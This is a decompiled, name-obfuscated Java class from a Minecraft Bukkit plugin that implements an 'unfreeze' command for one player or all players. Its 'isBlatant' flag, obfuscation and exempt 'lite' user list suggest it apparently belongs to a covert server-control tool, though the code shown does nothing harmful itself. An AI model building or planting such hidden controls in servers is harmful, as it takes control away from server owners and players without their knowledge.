/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class UnfreezeCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core lllllllllllllIllIIIIlIIIlIIIlIII, String lllllllllllllIllIIIIlIIIlIIIIlll, String[] lllllllllllllIllIIIIlIIIlIIIIIll, Player lllllllllllllIllIIIIlIIIlIIIIlIl) {
        if (lllllllllllllIllIIIIlIIIlIIIIIll.length <= 1) {
            lllllllllllllIllIIIIlIIIlIIIIlIl.sendMessage(Settings.USAGE("unfreeze <player>"));
        } else if (lllllllllllllIllIIIIlIIIlIIIIIll[1].equals("*")) {
            if (!lllllllllllllIllIIIIlIIIlIIIlIII.frozen) {
                lllllllllllllIllIIIIlIIIlIIIIlIl.sendMessage(Settings.PREFIX("Everyone is not frozen!"));
            } else {
                lllllllllllllIllIIIIlIIIlIIIlIII.frozen = false;
                for (Player lllllllllllllIllIIIIlIIIlIIIlIll : Bukkit.getOnlinePlayers()) {
                    if (lllllllllllllIllIIIIlIIIlIIIlIII.lite.contains(lllllllllllllIllIIIIlIIIlIIIlIll.getName())) continue;
                    lllllllllllllIllIIIIlIIIlIIIlIII.frozenPlayers.remove(lllllllllllllIllIIIIlIIIlIIIlIll.getName());
                }
                lllllllllllllIllIIIIlIIIlIIIlIII.frozenPlayers.clear();
                lllllllllllllIllIIIIlIIIlIIIIlIl.sendMessage(Settings.PREFIX("Everyone is no longer frozen"));
            }
        } else {
            Player lllllllllllllIllIIIIlIIIlIIIlIlI = Bukkit.getServer().getPlayer(lllllllllllllIllIIIIlIIIlIIIIIll[1]);
            if (lllllllllllllIllIIIIlIIIlIIIlIlI == null) {
                lllllllllllllIllIIIIlIIIlIIIIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIllIIIIlIIIlIIIIIll[1]).append(Settings.WHITE).append(" is not online."))));
            } else if (!lllllllllllllIllIIIIlIIIlIIIlIII.frozenPlayers.contains(lllllllllllllIllIIIIlIIIlIIIlIlI.getName())) {
                lllllllllllllIllIIIIlIIIlIIIIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIllIIIIlIIIlIIIlIlI.getName()).append(Settings.WHITE).append(" is not frozen!"))));
            } else {
                lllllllllllllIllIIIIlIIIlIIIlIII.frozenPlayers.remove(lllllllllllllIllIIIIlIIIlIIIlIlI.getName());
                lllllllllllllIllIIIIlIIIlIIIIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIllIIIIlIIIlIIIlIlI.getName()).append(Settings.WHITE).append(" is now unfrozen!"))));
            }
        }
    }

    public UnfreezeCommand() {
        UnfreezeCommand lllllllllllllIllIIIIlIIIlIIlIIlI;
    }
}

